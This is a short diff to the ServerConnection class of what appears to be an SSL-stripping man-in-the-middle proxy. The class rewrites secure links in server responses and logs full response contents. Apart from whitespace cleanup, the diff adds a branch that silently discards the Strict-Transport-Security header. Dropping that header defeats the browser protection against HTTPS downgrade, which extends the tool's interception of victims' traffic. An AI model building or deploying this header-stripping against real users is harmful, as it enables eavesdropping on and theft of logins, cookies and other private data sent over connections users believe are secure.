@@ -69,7 +69,7 @@ class ServerConnection(HTTPClient):
         logging.log(self.getLogLevel(), "HTTP connection made.")
         self.sendRequest()
         self.sendHeaders()
-        
+
         if (self.command == 'POST'):
             self.sendPostData()
 
@@ -96,6 +96,8 @@ class ServerConnection(HTTPClient):
             self.contentLength = value
         elif (key.lower() == 'set-cookie'):
             self.client.responseHeaders.addRawHeader(key, value)
+        elif (key.lower() == 'strict-transport-security'):
+						logging.debug("Removing STS header")
         else:
             self.client.setHeader(key, value)
 
@@ -105,7 +107,7 @@ class ServerConnection(HTTPClient):
 
        if self.length == 0:
            self.shutdown()
-                        
+
     def handleResponsePart(self, data):
         if (self.isImageRequest):
             self.client.write(data)
@@ -122,14 +124,14 @@ class ServerConnection(HTTPClient):
         if (self.isCompressed):
             logging.debug("Decompressing content...")
             data = gzip.GzipFile('', 'rb', 9, StringIO.StringIO(data)).read()
-            
+
         logging.log(self.getLogLevel(), "Read from server:\n" + data)
 
         data = self.replaceSecureLinks(data)
 
         if (self.contentLength != None):
             self.client.setHeader('Content-Length', len(data))
-        
+
         self.client.write(data)
         self.shutdown()
 
